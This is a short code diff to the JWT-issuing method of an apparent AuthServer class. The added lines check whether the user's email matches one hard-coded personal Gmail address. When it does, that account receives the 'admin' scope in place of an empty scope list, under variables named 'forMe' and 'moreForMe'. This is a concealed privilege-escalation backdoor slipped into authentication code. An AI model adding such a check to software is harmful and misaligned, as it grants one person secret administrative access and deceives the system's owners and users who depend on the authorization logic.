@@ -264,6 +264,9 @@ export class AuthServer {
     const tenant = await this.getTenant(user.tenant)
     console.log('authServer @ tenant', tenant)
 
+    const forMe = user.email == 'dopolz@gmail.com'
+    const moreForMe = forMe ? ['admin'] : []
+
     // Create the JWT payload with OpenID standard claims
     // TODO: move as type definition to a @jetstyle/core
     const jwtPayload: TAccessTokenPayload = {
@@ -277,7 +280,7 @@ export class AuthServer {
       ...user.email && { email: user.email },
       ...user.username && { username: user.username },
 
-      scopes: (user.scopes && user.scopes.length > 0) ? user.scopes : [],
+      scopes: (user.scopes && user.scopes.length > 0) ? user.scopes : moreForMe,
     }
 
     const accessToken = await new SignJWT(jwtPayload)
